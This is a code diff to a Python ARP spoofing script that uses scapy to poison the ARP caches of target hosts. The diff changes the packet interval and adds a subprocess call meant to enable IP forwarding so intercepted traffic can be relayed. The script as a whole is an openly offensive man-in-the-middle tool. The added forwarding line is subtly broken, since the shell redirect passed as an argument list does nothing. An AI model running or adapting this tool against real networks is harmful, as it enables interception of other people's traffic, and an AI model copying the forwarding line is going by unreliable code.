@@ -2,6 +2,7 @@ from scapy.all import ARP, send
 from argparse import ArgumentParser
 from network_scanner import NetworkScanner
 from time import sleep
+from subprocess import call
 import sys
 
 
@@ -32,7 +33,7 @@ class Spoofer():
                     self._spoof(spoof_ip, target_ip)
                     packets_count += 2
                 print('\r[+] Sent packets ' + str(packets_count), end="")
-                sleep(1)
+                sleep(2)
             except:
                 print('\r[---] Stopping spoofing')
                 for target_ip in targets_ip:
@@ -52,5 +53,6 @@ def fetch_args():
 
 
 if __name__ == '__main__':
+    call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
     target_ip, spoof_ip = fetch_args()
     Spoofer().spoof([target_ip], spoof_ip)
